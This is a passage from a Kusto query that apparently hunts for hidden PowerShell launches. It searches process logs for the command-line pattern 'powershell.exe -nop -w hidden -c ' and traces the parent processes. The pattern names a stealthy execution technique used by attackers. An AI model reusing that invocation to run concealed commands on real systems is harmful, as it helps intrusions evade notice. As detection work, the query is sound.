| where timestamp > datetime(2023-05-25T16:43:20)
| where process_commandline   contains "powershell.exe -nop -w hidden -c "
| distinct parent_process_name; //6
ProcessEvents
| where process_commandline has_any (parent_process) //1548
| distinct process_commandline

